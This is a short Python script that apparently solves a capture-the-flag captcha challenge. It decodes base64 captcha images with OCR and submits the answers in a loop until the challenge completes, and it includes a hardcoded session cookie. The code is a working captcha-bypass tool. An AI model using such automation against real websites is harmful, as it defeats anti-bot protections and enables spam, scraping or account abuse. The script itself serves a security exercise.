import requests
import re
from base64 import b64decode
from PIL import Image
from pytesseract import image_to_string
from io import BytesIO
from warnings import filterwarnings
filterwarnings('ignore')

def extractCaptcha(response):
    r = re.search('base64,([^"]*)', response).group(1)
    decoded = b64decode(r)
    stream = BytesIO(decoded)
    image = Image.open(stream)
    captcha = image_to_string(image).strip(" ")
    stream.close()

    return captcha.strip("\n")

def solveCaptcha(url, cookie, proxy, captcha):
    data = {"captcha":""}
    data["captcha"] = captcha
    req = requests.get(url, cookies=cookie)

    while 'more to go' in req.text:
        r = requests.post(url, cookies=cookie, data=data)
        response = r.text
        print(r.text)
        data["captcha"] = extractCaptcha(response)
    
    return True

def main():
    url = "https://captcha1.uctf.ir/"
    cookie = {"PHPSESSID":"6jnv85niptf21lshop0ht7liti"}
    proxy = {"https":"http://127.0.0.1:8080"}
    
    r = requests.get(url, cookies=cookie)
    response = r.text
    captcha = extractCaptcha(response)

    finalResponse = solveCaptcha(url, cookie, proxy, captcha)
    if finalResponse:
        print('\r[+] Captcha Brute Force Completed. ')

if __name__ == "__main__":
    main()
